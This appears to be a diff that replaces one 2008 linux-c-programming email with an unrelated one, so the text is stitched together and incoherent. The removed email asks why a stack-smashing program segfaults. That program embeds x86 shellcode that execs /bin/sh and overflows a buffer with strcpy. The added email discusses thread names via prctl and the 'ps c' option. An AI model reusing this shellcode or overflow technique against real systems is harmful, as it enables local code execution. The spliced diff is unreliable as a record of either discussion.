@@ -1,88 +1,46 @@
-From: Varun Chandramohan <varunc@linux.vnet.ibm.com>
-Subject: Re: buffer overflow
-Date: Wed, 12 Mar 2008 09:59:38 +0530
-Message-ID: <47D75C32.5030508@linux.vnet.ibm.com>
-References: <47D621E6.1090403@linux.vnet.ibm.com> <1205260349.5098.18.camel@localhost>
+From: "Bert Wesarg" <bert.wesarg@googlemail.com>
+Subject: Re: How to name the pthread or Renaming?
+Date: Wed, 12 Mar 2008 09:12:46 +0100
+Message-ID: <36ca99e90803120112s7091ea4foa616ecbd631cea38@mail.gmail.com>
+References: <47D51268.7020705@sun.com>
+	 <36ca99e90803100723q142411e0r8e0462be8eac5d6d@mail.gmail.com>
+	 <47D54A87.6010608@sun.com>
+	 <36ca99e90803100941u4294b271lb295ad4b2a3b33ed@mail.gmail.com>
+	 <47D61F00.1090507@sun.com>
+	 <36ca99e90803110605g16ed53a8je2e40316c9618ca4@mail.gmail.com>
+	 <47D78410.1020906@sun.com>
 Mime-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Return-path: <linux-c-programming-owner@vger.kernel.org>
-In-Reply-To: <1205260349.5098.18.camel@localhost>
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=googlemail.com; s=gamma;
+        h=domainkey-signature:received:received:message-id:date:from:to:subject:cc:in-reply-to:mime-version:content-type:content-transfer-encoding:content-disposition:references;
+        bh=QmodgnGr+36dAQ6EOjvVkil39tCTy+ZJg7rZ/G2fFAg=;
+        b=JmA0A4oHwepI+7/CfEPHx54ilC2/weKmpmVvAY38CW9I3nG2PLUV1p3edCMLwZZ87jTAbp9/LV/bEBEF4Az2DQRpNRHUoqIXp+vAi6wGbMrNfNoSDOIL4YdCDaTB+eIr1Ako4aE1mWGF0dIMcRmGzChH7tEeWCZtwBNN/4XVYhE=
+In-Reply-To: <47D78410.1020906@sun.com>
+Content-Disposition: inline
 Sender: linux-c-programming-owner@vger.kernel.org
 List-ID: <linux-c-programming.vger.kernel.org>
 Content-Type: text/plain; charset="us-ascii"
-To: vincent-perrier <vincent-perrier@club-internet.fr>
+To: Ziaudeen.Abdulrazak@sun.com
 Cc: linux-c-programming@vger.kernel.org
 
-vincent-perrier wrote:
-> This is bad:
-> memset(&buffer,0,sizeof(buffer));
-> buffer is already the address of the space:
-> memset(buffer,0,...); is what I would do
+On Wed, Mar 12, 2008 at 8:19 AM, ziaudeen <Ziaudeen.Abdulrazak@sun.com> wrote:
 >
->   
-fine.
-> This is bad too:
-> for (i = 0; i < 32; i++)
->    *(long_ptr + i) =  (long)&buffer;
+>  Bert Wesarg wrote:
+>  Ok, I was wrong, the name you can set with prctl is indeed a
+> per-thread attribute. you can see this either in the stat file from
+> the /proc filesystem (inside parentheses) or with ps and the comm
+> format, not the args format, and the same with top, where you switch
+> this with 'c'.
 >
-> and most certainly does not do what you want.
->
->   
-can you suggest something better to achieve this?
-> On Tue, 2008-03-11 at 11:38 +0530, Varun Chandramohan wrote:
->   
->> Hi all,
->>
->>              Can someone tell me whats is wrong with this program? All i
->> get is seg fault. Iam trying to create a stack overflow and exec a
->> shell. Somehow its not working. The system is x86 on linux.
->> gcc (GCC) 4.1.1 20070105 (Red Hat 4.1.1-52)
->> Copyright (C) 2006 Free Software Foundation, Inc.
->> This is free software; see the source for copying conditions.  There is NO
->> warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
->>
->>
->>
->> The Code:
->> #include <stdio.h>
->> #include <string.h>
->>
->> char shellcode[] =
->>         "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
->>         "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
->>         "\x80\xe8\xdc\xff\xff\xff/bin/sh";
->> #if 0
->> char shellcode[] =
->>         "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
->>         "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
->>         "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
->>         "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
->>
->> #endif
->>
->> char large_string[128];
->> int main() {
->>   char buffer[96];
->>   int i;
->>   long *long_ptr = (long *) large_string;
->>   memset(&buffer,0,sizeof(buffer));
->>
->>   for (i = 0; i < 32; i++)
->>     *(long_ptr + i) =  (long)&buffer;
->>
->>   for (i = 0; i < strlen(shellcode); i++)
->>     large_string[i] = shellcode[i];
->>
->>   strcpy(buffer,large_string);
->> }
->>
->> --
->> To unsubscribe from this list: send the line "unsubscribe linux-c-programming" in
->> the body of a message to majordomo@vger.kernel.org
->> More majordomo info at  http://vger.kernel.org/majordomo-info.html
->> &#0;
->>
->>     
->
->   
+>  Could you please tell me exactly what is the command " ps -c" Is it ? I
+> don't understand the comm mode means..
+I wrote 'comm format' and not 'mode'. if you mean with the '-c' the
+misc option 'true command name', than why do you put a '-' in front of
+it? the help message shows only a single 'c' => "ps c"
 
+Bert
+
+>
+>  - Ziaudeen
